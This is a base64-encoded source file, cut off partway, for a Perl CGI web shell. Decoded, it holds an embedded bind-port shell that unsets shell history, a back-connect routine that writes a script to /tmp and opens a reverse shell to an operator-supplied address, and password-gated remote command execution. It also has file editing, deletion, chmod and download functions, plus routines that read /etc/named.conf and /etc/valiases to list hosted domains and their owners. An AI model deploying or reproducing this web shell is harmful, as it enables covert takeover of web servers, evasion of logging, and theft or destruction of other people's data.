aElqc05Dbk5sZEhOdlkydHZjSFFvVTBWU1ZrVlNMQ0JUVDB4ZlUwOURTMFZVTENCVFQxOVNSVlZUUlVGRVJGSXNJSEJoWTJzb0ltd2lMQ0F4S1NsdmNpQmthV1VnSW5ObGRITnZZMnR2Y0hRNklDUWhJanNOQ21KcGJtUW9VMFZTVmtWU0xDQnpiMk5yWVdSa2NsOXBiaWdrY0c5eWRDd2dTVTVCUkVSU1gwRk9XU2twYjNJZ1pHbGxJQ0ppYVc1a09pQWtJU0k3RFFwc2FYTjBaVzRvVTBWU1ZrVlNMQ0JUVDAxQldFTlBUazRwQ1FsdmNpQmthV1VnSW14cGMzUmxiam9nSkNFaU93MEtabTl5S0RzZ0pIQmhaR1J5SUQwZ1lXTmpaWEIwS0VOTVNVVk9WQ3dnVTBWU1ZrVlNLVHNnWTJ4dmMyVWdRMHhKUlU1VUtRMEtldzBLQ1c5d1pXNG9VMVJFU1U0c0lDSStKa05NU1VWT1ZDSXBPdzBLQ1c5d1pXNG9VMVJFVDFWVUxDQWlQaVpEVEVsRlRsUWlLVHNOQ2dsdmNHVnVLRk5VUkVWU1Vpd2dJajRtUTB4SlJVNVVJaWs3RFFvSmMzbHpkR1Z0S0NKMWJuTmxkQ0JJU1ZOVVJrbE1SVHNnZFc1elpYUWdVMEZXUlVoSlUxUWdPMlZqYUc4Z0oxc3JYU0JUZVhOMFpXMXBibVp2T2lBbk95QjFibUZ0WlNBdFlUdGxZMmh2TzJWamFHOGdKMXNyWFNCVmMyVnlhVzVtYnpvZ0p6c2dhV1E3WldOb2J6dGxZMmh2SUNkYksxMGdSR2x5WldOMGIzSjVPaUFuT3lCd2QyUTdaV05vYnpzZ1pXTm9ieUFuV3l0ZElGTm9aV3hzT2lBbk95UlRhR1ZzYkNJcE93MEtDV05zYjNObEtGTlVSRWxPS1RzTkNnbGpiRzl6WlNoVFZFUlBWVlFwT3cwS0NXTnNiM05sS0ZOVVJFVlNVaWs3RFFwOURRbz0iOw0KDQoJJENsaWVudEFkZHIgPSAkaW57J2NsaWVudGFkZHInfTsNCgkkQ2xpZW50UG9ydCA9IGludCgkaW57J2NsaWVudHBvcnQnfSk7DQoJaWYoJENsaWVudFBvcnQgZXEgMCkNCgl7DQoJCXJldHVybiAmQmFja0JpbmRGb3JtOw0KCX1lbHNpZighJENsaWVudEFkZHIgZXEgIiIpDQoJew0KCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiYWNrcGVybCk7DQoJCWlmKC13ICIvdG1wLyIpDQoJCXsNCgkJCSRGaWxlPSIvdG1wL2JhY2tjb25uZWN0LnBsIjsJDQoJCX1lbHNlDQoJCXsNCgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiYWNrY29ubmVjdC5wbCI7DQoJCX0NCgkJb3BlbihGSUxFLCAiPiRGaWxlIik7DQoJCXByaW50IEZJTEUgJERhdGE7DQoJCWNsb3NlIEZJTEU7DQoJCXN5c3RlbSgicGVybCBiYWNrY29ubmVjdC5wbCAkQ2xpZW50QWRkciAkQ2xpZW50UG9ydCIpOw0KCQl1bmxpbmsoJEZpbGUpOw0KCQlleGl0IDA7DQoJfWVsc2UNCgl7DQoJCSREYXRhPWRlY29kZV9iYXNlNjQoJGJpbmRwZXJsKTsNCgkJaWYoLXcgIi90bXAiKQ0KCQl7DQoJCQkkRmlsZT0iL3RtcC9iaW5kcG9ydC5wbCI7CQ0KCQl9ZWxzZQ0KCQl7DQoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmluZHBvcnQucGwiOw0KCQl9DQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlzeXN0ZW0oInBlcmwgYmluZHBvcnQucGwgJENsaWVudFBvcnQiKTsNCgkJdW5saW5rKCRGaWxlKTsNCgkJZXhpdCAwOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgIEFycmF5IExpc3QgRGlyZWN0b3J5DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUm1EaXIoJCkgDQp7DQoJbXkgJGRpciA9IHNoaWZ0Ow0KICAgIGlmKG9wZW5kaXIoRElSLCRkaXIpKQ0KCXsNCgkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpDQoJCXsNCgkJCWlmKCgkZmlsZSBuZSAiLiIpICYmICgkZmlsZSBuZSAiLi4iKSkNCgkJCXsNCgkJCQkkZmlsZT0gJGRpci4kUGF0aFNlcC4kZmlsZTsNCgkJCQlpZigtZCAkZmlsZSkNCgkJCQl7DQoJCQkJCSZSbURpcigkZmlsZSk7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJCXVubGluaygkZmlsZSk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCWNsb3NlZGlyKERJUik7DQoJfQ0KCWlmKCFybWRpcigkZGlyKSkNCgl7DQoJCQ0KCX0NCn0NCnN1YiBGaWxlT3duZXIoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCR1aWQsJGdpZCkgPSAoc3RhdCgkZmlsZSkpWzQsNV07DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJcmV0dXJuICI/Pz8iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJG5hbWU9Z2V0cHd1aWQoJHVpZCk7DQoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7DQoJCQlyZXR1cm4gJG5hbWUuIi8iLiRncm91cDsNCgkJfQ0KCX0NCglyZXR1cm4gIj8/PyI7DQp9DQpzdWIgUGFyZW50Rm9sZGVyKCQpDQp7DQoJbXkgJHBhdGggPSBzaGlmdDsNCglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7DQoJY2hvcCgkcGF0aCA9IGAkQ29tbWApOw0KCXJldHVybiAkcGF0aDsNCn0NCnN1YiBGaWxlUGVybXMoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCW15ICR1ciA9ICItIjsNCglteSAkdXcgPSAiLSI7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWlmKC1yICRmaWxlKXsgJHVyID0gInIiOyB9DQoJCQlpZigtdyAkZmlsZSl7ICR1dyA9ICJ3IjsgfQ0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3Ow0KCQl9ZWxzZQ0KCQl7DQoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOw0KCQkJJHJlc3VsdCA9IHNwcmludGYoIiUwNG8iLCAkbW9kZSAmIDA3Nzc3KTsNCgkJCXJldHVybiAkcmVzdWx0Ow0KCQl9DQoJfQ0KCXJldHVybiAiMDAwMCI7DQp9DQpzdWIgRmlsZUxhc3RNb2RpZmllZCgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07DQoJCSgkZCwkbSwkeSwkaCwkaSkgPSAobG9jYWx0aW1lKCRsYSkpWzMsNCw1LDIsMV07DQoJCSR5ID0gJHkgKyAxOTAwOw0KCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87DQoJCSRsbXRpbWUgPSBzcHJpbnRmKCIlMDJkLyVzLyU0ZCAlMDJkOiUwMmQiLCRkLCRtb250aFskbV0sJHksJGgsJGkpOw0KCQlyZXR1cm4gJGxtdGltZTsNCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIEZpbGVTaXplKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZiAkZmlsZSkNCgl7DQoJCXJldHVybiAtcyAkZmlsZTsNCgl9DQoJcmV0dXJuICIwIjsNCg0KfQ0Kc3ViIFBhcnNlRmlsZVNpemUoJCkNCnsNCglteSAkc2l6ZSA9IHNoaWZ0Ow0KCWlmKCRzaXplIDw9IDEwMjQpDQoJew0KCQlyZXR1cm4gJHNpemUuICIgQiI7DQoJfQ0KCWVsc2UNCgl7DQoJCWlmKCRzaXplIDw9IDEwMjQqMTAyNCkgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBLQiI7DQoJCX0NCgkJZWxzZSANCgkJew0KCQkJJHNpemUgPSBzcHJpbnRmKCIlLjJmIiwkc2l6ZSAvIDEwMjQgLyAxMDI0KTsNCgkJCXJldHVybiAkc2l6ZS4iIE1CIjsNCgkJfQ0KCX0NCn0NCnN1YiB0cmltKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmcgPX4gcy9eXHMrLy87DQoJJHN0cmluZyA9fiBzL1xzKyQvLzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBBZGRTbGFzaGVzKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmc9fiBzL1xcL1xcXFwvZzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBMaXN0RGlyDQp7DQoJbXkgJHBhdGggPSAkQ3VycmVudERpci4kUGF0aFNlcDsNCgkkcGF0aD1+IHMvXFxcXC9cXC9nOw0KCW15ICRyZXN1bHQgPSAiPGZvcm0gbmFtZT0nZicgYWN0aW9uPSckU2NyaXB0TG9jYXRpb24nPjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+UGF0aDogWyAiLiZBZGRMaW5rRGlyKCJndWkiKS4iIF0gPC9zcGFuPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDaGFuZ2UnPjwvZm9ybT4iOw0KCWlmKC1kICRwYXRoKQ0KCXsNCgkJbXkgQGZuYW1lID0gKCk7DQoJCW15IEBkbmFtZSA9ICgpOw0KCQlpZihvcGVuZGlyKERJUiwkcGF0aCkpDQoJCXsNCgkJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQ0KCQkJew0KCQkJCSRmPSRwYXRoLiRmaWxlOw0KCQkJCWlmKC1kICRmKQ0KCQkJCXsNCgkJCQkJcHVzaChAZG5hbWUsJGZpbGUpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQlwdXNoKEBmbmFtZSwkZmlsZSk7DQoJCQkJfQ0KCQkJfQ0KCQkJY2xvc2VkaXIoRElSKTsNCgkJfQ0KCQlAZm5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZm5hbWU7DQoJCUBkbmFtZSA9IHNvcnQgeyBsYygkYSkgY21wIGxjKCRiKSB9IEBkbmFtZTsNCgkJJHJlc3VsdCAuPSAiPGRpdj48dGFibGUgd2lkdGg9JzkwJScgY2xhc3M9J2xpc3RkaXInPg0KDQoJCTx0ciBzdHlsZT0nYmFja2dyb3VuZC1jb2xvcjogIzNlM2UzZSc+PHRoPkZpbGUgTmFtZTwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MTAwcHg7Jz5GaWxlIFNpemU8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+T3duZXI8L3RoPg0KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+UGVybWlzc2lvbjwvdGg+DQoJCTx0aCBzdHlsZT0nd2lkdGg6MTUwcHg7Jz5MYXN0IE1vZGlmaWVkPC90aD4NCgkJPHRoIHN0eWxlPSd3aWR0aDoyNjBweDsnPkFjdGlvbjwvdGg+PC90cj4iOw0KCQlteSAkc3R5bGU9ImxpbmUiOw0KCQlteSAkaT0wOw0KCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZCA9ICZ0cmltKCRkKTsNCgkJCSRkaXJuYW1lPSRkOw0KCQkJaWYoJGQgZXEgIi4uIikgDQoJCQl7DQoJCQkJJGQgPSAmUGFyZW50Rm9sZGVyKCRwYXRoKTsNCgkJCX0NCgkJCWVsc2lmKCRkIGVxICIuIikgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aDsNCgkJCX0NCgkJCWVsc2UgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aC4kZDsNCgkJCX0NCgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz4NCg0KCQkJPHRkIGlkPSdGaWxlXyRpJyBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPjxhICBocmVmPSc/YT1ndWkmZD0iLiRkLiInPlsgIi4kZGlybmFtZS4iIF08L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPkRJUjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOycgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZCkuIicsJyIuJGRpcm5hbWUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCIuJGkuIiwnIi4kZGlybmFtZS4iJylcIiA+Ii4mRmlsZVBlcm1zKCRkKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlTGFzdE1vZGlmaWVkKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZGlybmFtZScsJyIuJkFkZFNsYXNoZXMoJkFkZFNsYXNoZXMoJGQpKS4iJylcIj5SZW5hbWU8L2E+ICB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGRpcjogJGRpcm5hbWUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPC90cj4iOw0KCQkJJGkrKzsNCgkJfQ0KCQlmb3JlYWNoIG15ICRmIChAZm5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZT0kZjsNCgkJCSRmID0gJHBhdGguJGY7DQoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7DQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+PHRkIGlkPSdGaWxlXyRpJyBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyc+PGEgaHJlZj0nP2E9Y29tbWFuZCZkPSIuJHBhdGguIiZjPWVkaXQlMjAiLiRmaWxlLiInPiIuJGZpbGUuIjwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mUGFyc2VGaWxlU2l6ZSgmRmlsZVNpemUoJGYpKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7JyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRmKS4iJywnIi4kZmlsZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oJGksJyRmaWxlJylcIiA+Ii4mRmlsZVBlcm1zKCRmKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlTGFzdE1vZGlmaWVkKCRmKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz5FZGl0PC9hPiB8IDxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZmlsZScsJ2YnKVwiPlJlbmFtZTwvYT4gfCA8YSBocmVmPSc/YT1kb3dubG9hZCZvPWdvJmY9Ii4kZi4iJz5Eb3dubG9hZDwvYT4gfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBmaWxlOiAkZmlsZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0kcGF0aCZyZW1vdmU9JGZpbGUnPlJlbW92ZTwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8L3RyPiI7DQoJCQkkaSsrOw0KCQl9DQoJCSRyZXN1bHQgLj0gIjwvdGFibGU+PC9kaXY+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRyeSB0byBWaWV3IExpc3QgVXNlcg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFZpZXdEb21haW5Vc2VyDQp7DQoJb3BlbiAoZG9tYWlucywgJy9ldGMvbmFtZWQuY29uZicpIG9yICRlcnI9MTsNCglteSBAY256cyA9IDxkb21haW5zPjsNCgljbG9zZSBkMG1haW5zOw0KCW15ICRzdHlsZT0ibGluZSI7DQoJbXkgJHJlc3VsdD0iPGg1Pjxmb250IHN0eWxlPSdmb250OiAxNXB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Ib2FuZyBTYSAtIFRydW9uZyBTYTwvZm9udD48L2g1PiI7DQoJaWYgKCRlcnIpDQoJew0KCQkkcmVzdWx0IC49ICAoJzxwPkMwdWxkblwndCBCeXBhc3MgaXQgLCBTb3JyeTwvcD4nKTsNCgkJcmV0dXJuICRyZXN1bHQ7DQoJfWVsc2UNCgl7DQoJCSRyZXN1bHQgLj0gJzx0YWJsZT48dHI+PHRoPkRvbWFpbnM8L3RoPiA8dGg+VXNlcjwvdGg+PC90cj4nOw0KCX0NCglmb3JlYWNoIG15ICRvbmUgKEBjbnpzKQ0KCXsNCgkJaWYoJG9uZSA9fiBtLy4qP3pvbmUgIiguKj8pIiB7LykNCgkJewkNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZW5hbWU9ICIvZXRjL3ZhbGlhc2VzLyIuJG9uZTsNCgkJCSRvd25lciA9IGdldHB3dWlkKChzdGF0KCRmaWxlbmFtZSkpWzRdKTsNCgkJCSRyZXN1bHQgLj0gJzx0ciBjbGFzcz0iJHN0eWxlIiB3aWR0aD01MCU+PHRkPicuJG9uZS4nIDwvdGQ+PHRkPiAnLiRvd25lci4nPC90ZD48L3RyPic7DQoJCX0NCgl9DQoJJHJlc3VsdCAuPSAnPC90YWJsZT4nOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBWaWV3IExvZw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFZpZXdMb2cNCnsNCglpZigkV2luTlQpDQoJew0KCQlyZXR1cm4gIjxoMj48Zm9udCBzdHlsZT0nZm9udDogMjBwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+RG9uJ3QgcnVuIG9uIFdpbmRvd3M8L2ZvbnQ+PC9oMj4iOw0KCX0NCglteSAkcmVzdWx0PSI8dGFibGU+PHRyPjx0aD5QYXRoIExvZzwvdGg+PHRoPlN1Ym1pdDwvdGg+PC90cj4iOw0KCW15IEBwYXRobG9nPSgNCgkJCQknL3Vzci9sb2NhbC9hcGFjaGUvbG9ncy9lcnJvcl9sb2cnLA0KCQkJCScvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2cnLA0KCQkJCScvdXNyL2xvY2FsL2FwYWNoZS9sb2dzL2FjY2Vzc19sb2cnDQoJCQkJKTsNCglteSAkaT0wOw0KCW15ICRwZXJtczsNCglteSAkc2w7DQoJZm9yZWFjaCBteSAkbG9nIChAcGF0aGxvZykNCgl7DQoJCWlmKC13ICRsb2cpDQoJCXsNCgkJCSRwZXJtcz0iT0siOw0KCQl9ZWxzZQ0KCQl7DQoJCQljaG9wKCRzbCA9IGBsbiAtcyAkbG9nIGVycm9yX2xvZ18kaWApOw0KCQkJaWYoJnRyaW0oJGxzKSBlcSAiIikNCgkJCXsNCgkJCQlpZigtciAkbHMpDQoJCQkJew0KCQkJCQkkcGVybXM9Ik9LIjsNCgkJCQkJJGxvZz0iZXJyb3JfbG9nXyIuJGk7DQoJCQkJfQ0KCQkJfWVsc2UNCgkJCXsNCgkJCQkkcGVybXM9Ijxmb250IHN0eWxlPSdjb2xvcjogcmVkOyc+Q2FuY2VsPGZvbnQ+IjsNCgkJCX0NCgkJfQ0KCQkkcmVzdWx0IC49PDxFTkQ7DQoJCTx0cj4NCg0KCQkJPGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCI+DQoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dfJGknKS52YWx1ZT0nbGVzcyAnICsgdGhpcy52YWx1ZTsiIHZhbHVlPSIkbG9nIiBzaXplPSc1MCcvPjwvdGQ+DQoJCQk8dGQ+PGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlRyeSIgLz48L3RkPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgaWQ9ImxvZ18kaSIgbmFtZT0iYyIgdmFsdWU9Imxlc3MgJGxvZyIvPg0KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiIC8+DQoJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiIC8+DQoJCQk8L2Zvcm0+DQoJCQk8dGQ+JHBlcm1zPC90ZD4NCg0KCQk8L3RyPg0KRU5EDQoJCSRpKys7DQoJfQ0KCSRyZXN1bHQgLj0iPC90YWJsZT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBNYWluIFByb2dyYW0gLSBFeGVjdXRpb24gU3RhcnRzIEhlcmUNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiZSZWFkUGFyc2U7DQomR2V0Q29va2llczsNCg0KJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsNCiRTZXJ2ZXJOYW1lID0gJEVOVnsnU0VSVkVSX05BTUUnfTsNCiRMb2dpblBhc3N3b3JkID0gJGlueydwJ307DQokUnVuQ29tbWFuZCA9ICRpbnsnYyd9Ow0KJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9Ow0KJE9wdGlvbnMgPSAkaW57J28nfTsNCiRBY3Rpb24gPSAkaW57J2EnfTsNCg0KJEFjdGlvbiA9ICJjb21tYW5kIiBpZigkQWN0aW9uIGVxICIiKTsgIyBubyBhY3Rpb24gc3BlY2lmaWVkLCB1c2UgZGVmYXVsdA0KDQojIGdldCB0aGUgZGlyZWN0b3J5IGluIHdoaWNoIHRoZSBjb21tYW5kcyB3aWxsIGJlIGV4ZWN1dGVkDQokQ3VycmVudERpciA9ICZ0cmltKCRpbnsnZCd9KTsNCiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQ0KJFJ1bkNvbW1hbmQ9ICRXaW5OVD8iZGlyIjoiZGlyIC1saWEiIGlmKCRSdW5Db21tYW5kIGVxICIiKTsNCmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsNCg0KJExvZ2dlZEluID0gJENvb2tpZXN7J1NBVkVEUFdEJ30gZXEgJFBhc3N3b3JkOw0KDQppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgCQkjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luDQp7DQoJJlBlcmZvcm1Mb2dpbjsNCn1lbHNpZigkQWN0aW9uIGVxICJndWkiKSAjIEdVSSBkaXJlY3RvcnkNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCWlmKCEoJGNobW9kIGVxIDApKQ0KCQl7DQoJCQkkY2htb2Q9aW50KCRpbnsnY2htb2QnfSk7DQoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCQkJY2hvcCgkcmVzdWx0PSBgY2htb2QgJGNobW9kICIkZmlsZSJgKTsNCgkJCWlmKCZ0cmltKCRyZXN1bHQpIGVxICIiKQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBEb25lISA8L3J1bj48YnI+IjsNCgkJCX1lbHNlDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IFNvcnJ5ISBZb3UgZG9udCBoYXZlIHBlcm1pc3Npb25zISA8L3J1bj48YnI+IjsNCgkJCX0NCgkJfQ0KCX0NCgkkcmVuYW1lPSRpbnsncmVuYW1lJ307DQoJaWYoISRyZW5hbWUgZXEgIiIpDQoJew0KCQlpZihyZW5hbWUoJFRyYW5zZmVyRmlsZSwkcmVuYW1lKSkNCgkJew0KCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQl9ZWxzZQ0KCQl7DQoJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQl9DQoJfQ0KCSRyZW1vdmU9JGlueydyZW1vdmUnfTsNCglpZigkcmVtb3ZlIG5lICIiKQ0KCXsNCgkJJHJtID0gJEN1cnJlbnREaXIuJFBhdGhTZXAuJHJlbW92ZTsNCgkJaWYoLWQgJHJtKQ0KCQl7DQoJCQkmUm1EaXIoJHJtKTsNCgkJfWVsc2UNCgkJew0KCQkJaWYodW5saW5rKCRybSkpDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQkJfWVsc2UNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQkJfQkJCQ0KCQl9DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0